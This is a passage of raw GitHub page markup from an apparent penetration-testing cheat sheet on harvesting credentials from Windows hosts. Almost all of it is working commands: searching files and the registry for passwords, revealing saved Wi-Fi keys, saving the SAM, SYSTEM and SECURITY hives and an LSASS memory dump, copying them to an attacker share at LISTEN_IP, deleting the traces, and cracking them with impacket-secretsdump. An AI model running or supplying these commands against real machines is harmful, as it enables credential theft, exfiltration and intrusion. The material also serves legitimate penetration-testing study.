0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSome of these passwords are cleartext, others are base64-encoded. Groups.xml has\nan AES-encrypted password, but the static key is published on the MSDN website.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo decrypt the Groups.xml password: \u003ccode\u003egpp-decrypt encryptedpassword\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Unattend files\n%SYSTEMDRIVE%\\unattend.txt\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n\n# Group Policy Object files\n# decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)\n%WINDIR%\\SYSVOL\\Groups.xml\n%WINDIR%\\SYSVOL\\scheduledtasks.xml\n%WINDIR%\\SYSVOL\\Services.xml\n\n# sysprep\n%SYSTEMDRIVE%\\sysprep.inf\n%SYSTEMDRIVE%\\sysprep\\sysprep.xml\n\n# FileZilla config:\n# look for admin creds in FileZilla Server.xml\ndir /s/b C:\\FileZilla*.xml\ntype \u0026quot;FileZilla Server.xml\u0026quot; | findstr /spin /c:admin\ntype \u0026quot;FileZilla Server Interface.xml\u0026quot; | findstr /spin /c:admin\n\n# less likely, still worth looking\n%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Unattend files\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMDRIVE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\unattend.txt\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\Panther\\Unattend\\Unattended.xml\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\Panther\\Unattended.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Group Policy Object files\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\SYSVOL\\Groups.xml\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\SYSVOL\\scheduledtasks.xml\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\SYSVOL\\Services.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e sysprep\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMDRIVE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\sysprep.inf\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMDRIVE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\sysprep\\sysprep.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e FileZilla config:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for admin creds in FileZilla Server.xml\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb C:\\FileZilla\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.xml\ntype \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eFileZilla Server.xml\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003espin \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ec:admin\ntype \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eFileZilla Server Interface.xml\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003espin \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ec:admin\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e less likely, still worth looking\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMDRIVE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\pagefile.sys\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\debug\\NetSetup.log\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\iis6.log\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\AppEvent.Evt\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\config\\SecEvent.Evt\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system32\\CCM\\logs\\\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.log\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eUSERPROFILE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\ntuser.dat\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eUSERPROFILE\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\LocalS~\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\\Tempor~\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\\Content.IE5\\index.dat\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFinding Passwords in Windows Files\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# search specific filetypes for \u0026quot;password\u0026quot;\nfindstr /spin password *.txt *.xml *.ini *.config\n\n# Searching all files (lots of output)\nfindstr /spin \u0026quot;password\u0026quot; *.*\n\n# find files that might have credentials in them\ncd \\ \u0026amp;\u0026amp; dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*\ndir /b /s *passw* *creds* *credential*\ndir /b /s *.config *.conf *.cfg\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e search specific filetypes for \"password\"\u003c/span\u003e\nfindstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003espin password \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.txt \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.xml \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.ini \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.config\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Searching all files (lots of output)\u003c/span\u003e\nfindstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003espin \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epassword\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find files that might have credentials in them\u003c/span\u003e\ncd \\ \u0026amp;\u0026amp; dir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003evnc.ini Groups.xml sysprep.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e Unattend.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e Unattended.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003epassw\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003ecreds\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003ecredential\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.config \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.conf \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.cfg\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.2 Windows Passwords in Registry\u003c/h3\u003e\u003ca id=\"user-content-442-windows-passwords-in-registry\" class=\"anchor\" aria-label=\"Permalink: 4.4.2 Windows Passwords in Registry\" href=\"#442-windows-passwords-in-registry\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Windows autologin credentials (32-bit and 64-bit versions)\nreg query \u0026quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026quot; 2\u0026gt;nul | findstr \u0026quot;DefaultUserName DefaultDomainName DefaultPassword\u0026quot;\nreg query \u0026quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026quot; /reg:64 2\u0026gt;nul | findstr /i \u0026quot;DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername\u0026quot;\n\n# VNC\nreg query \u0026quot;HKCU\\Software\\ORL\\WinVNC3\\Password\u0026quot;\nreg query \u0026quot;HKCU\\Software\\TightVNC\\Server\u0026quot;\n\n# SNMP Paramters\nreg query \u0026quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026quot;\n\n# Putty\nreg query \u0026quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026quot;\n\n# Search for password in registry\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows autologin credentials (32-bit and 64-bit versions)\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003enul \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDefaultUserName DefaultDomainName DefaultPassword\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ereg:\u003cspan class=\"pl-c1\"\u003e64\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003enul \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ei \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e VNC\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKCU\\Software\\ORL\\WinVNC3\\Password\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKCU\\Software\\TightVNC\\Server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SNMP Paramters\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Putty\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Search for password in registry\u003c/span\u003e\nreg query HKLM \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\nreg query HKCU \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eWifi Passwords Saved on Windows\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# show all saved wifi networks\nnetsh wlan show profiles\n\n# get password of specific network 'WIFINAME'\nwlan show profile WIFINAME key=clear\n\n# PEAP wifi network passwords are stored in registry\n# Display all keys, values and data under the PEAP profiles:\nreg query 'HKLM\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles' /s /f *\nreg query 'HKCU\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles' /s /f *\n\n# Save the passwords in registry to a file\nreg save 'HKLM\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles' peap-profiles-hklm.hiv\nreg save 'HKCU\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles' peap-profiles-hkcu.hiv\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show all saved wifi networks\u003c/span\u003e\nnetsh wlan show profiles\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get password of specific network 'WIFINAME'\u003c/span\u003e\nwlan show profile WIFINAME key\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eclear\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PEAP wifi network passwords are stored in registry\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Display all keys, values and data under the PEAP profiles:\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKLM\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\nreg query \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKCU\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Save the passwords in registry to a file\u003c/span\u003e\nreg save \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKLM\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e peap\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eprofiles\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ehklm.hiv\nreg save \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eHKCU\\Software\\Microsoft\\Wlansvc\\UserData\\Profiles\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e peap\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eprofiles\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ehkcu.hiv\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3 Grabbing Hashes from Windows\u003c/h3\u003e\u003ca id=\"user-content-443-grabbing-hashes-from-windows\" class=\"anchor\" aria-label=\"Permalink: 4.4.3 Grabbing Hashes from Windows\" href=\"#443-grabbing-hashes-from-windows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Grab them from the registry\nreg save hklm\\sam %TEMP%\\sam.hiv /y\nreg save hklm\\system %TEMP%\\system.hiv /y\nreg save hklm\\security %TEMP%\\security.hiv /y\ncopy %TEMP%\\sam.hiv \\\\LISTEN_IP\\share\ncopy %TEMP%\\system.hiv \\\\LISTEN_IP\\share\ncopy %TEMP%\\security.hiv \\\\LISTEN_IP\\share\n\n# clean up stolen registry files\ndel %TEMP%\\*.hiv\n\n# Grab the backups from disk\ncopy %WINDIR%\\repair\\sam \\\\LISTEN_IP\\share\\sam-repair.hiv\ncopy %WINDIR%\\repair\\system \\\\LISTEN_IP\\share\\system-repair.hiv\ncopy %WINDIR%\\repair\\security \\\\LISTEN_IP\\share\\security-repair.hiv\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Grab them from the registry\u003c/span\u003e\nreg save hklm\\sam \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\sam.hiv \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ey\nreg save hklm\\system \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system.hiv \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ey\nreg save hklm\\security \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\security.hiv \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ey\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\sam.hiv \\\\LISTEN_IP\\share\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\system.hiv \\\\LISTEN_IP\\share\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\security.hiv \\\\LISTEN_IP\\share\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e clean up stolen registry files\u003c/span\u003e\ndel \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.hiv\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Grab the backups from disk\u003c/span\u003e\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\sam \\\\LISTEN_IP\\share\\sam\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erepair.hiv\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\system \\\\LISTEN_IP\\share\\system\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erepair.hiv\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eWINDIR\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\security \\\\LISTEN_IP\\share\\security\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003erepair.hiv\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen, on attack box:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using impacket secretsdump.py (security.hiv optional)\nimpacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using impacket secretsdump.py (security.hiv optional)\u003c/span\u003e\nimpacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, you can grab the hashes directly from LSASS.exe memory using\nSysinternals tools:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"procdump64.exe -accepteula -ma lsass.exe %TEMP%\\lsass.mem\ncopy %TEMP%\\lsass.mem \\\\LISTEN_IP\\share\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003eprocdump64.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eaccepteula \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ema \u003cspan class=\"pl-c1\"\u003elsass.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\lsass.mem\ncopy \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eTEMP\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\lsass.mem \\\\LISTEN_IP\\share\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.4.3.1 Dumping Hashes from Windows Registry Backups\u003c/h4\u003e\u003ca id=\"user-content-4431-dumping-hashes-from-windows-registry-backups\" class=\"anchor\" aria-label=\"Permalink: 4.4.3.1 Dumping Hashes from Windows Registry Backups\" href=\"#4431-dumping-hashes-from-windows-registry-backups\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eLook for these files:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" 